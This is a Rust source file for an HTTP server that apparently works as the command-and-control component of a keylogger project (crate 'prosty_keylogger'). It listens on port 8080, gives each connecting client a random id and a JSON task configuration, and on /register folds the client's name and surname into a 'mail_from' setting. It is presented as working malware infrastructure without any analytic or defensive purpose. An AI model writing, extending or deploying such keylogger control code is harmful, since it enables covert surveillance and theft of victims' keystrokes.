use actix_web::{App, get, HttpResponse, HttpServer, post, Responder, web};
use clap::Parser;
use log::info;
use rand::{Rng, thread_rng};
use prosty_keylogger::common::{PersonalData, setup_logger, TaskConfiguration};
use crate::options::Args;

mod options;

struct AppState{
    pub config: TaskConfiguration,
    //pub rng: rand::rngs::ThreadRng,
}

#[post("/register")]
async fn register_and_send_config(info: web::Json<PersonalData>, data: web::Data<AppState>) -> impl Responder{
    let mut d = data.config.clone();
    let mut rng = thread_rng();
    d.id = rng.sample(rand::distributions::Uniform::new(0, u64::MAX));

    let mut s = String::new();
    if let Some(name) = &info.name{
        s += name;
        s += " "
    }
    if let Some(surname) = &info.last_name{
        s += surname;
        s += " ";
    }
    s += &data.config.mail_from;
    d.mail_from = s;

    info!("Registered client {:?}", &d);
    let config_json = serde_json::to_string(&d).unwrap();


    //let json = serde_json::to_string(&config).unwrap();
    HttpResponse::Ok().body(config_json)


}


#[get("/")]
async fn send_basic_config(data: web::Data<AppState>) -> impl Responder {
    let mut d = data.config.clone();
    let mut rng = thread_rng();
    d.id = rng.sample(rand::distributions::Uniform::new(0, u64::MAX));

    let config_json = serde_json::to_string(&d).unwrap();

    info!("Registered client {:?}", &d);

    //let json = serde_json::to_string(&config).unwrap();
    HttpResponse::Ok().body(config_json)
}
#[actix_web::main]
async fn main() -> anyhow::Result<()>{

    setup_logger(log::LevelFilter::Debug)?;

    let args = Args::parse();

    let config = TaskConfiguration::from(&args);
    //let config_json = serde_json::to_string(&config);


    Ok(HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(AppState{
                config: config.clone(),
            }))
            .service(send_basic_config)
            .service(register_and_send_config)
    })
        .bind(("0.0.0.0", 8080))?
        .run()
        .await?
    )
}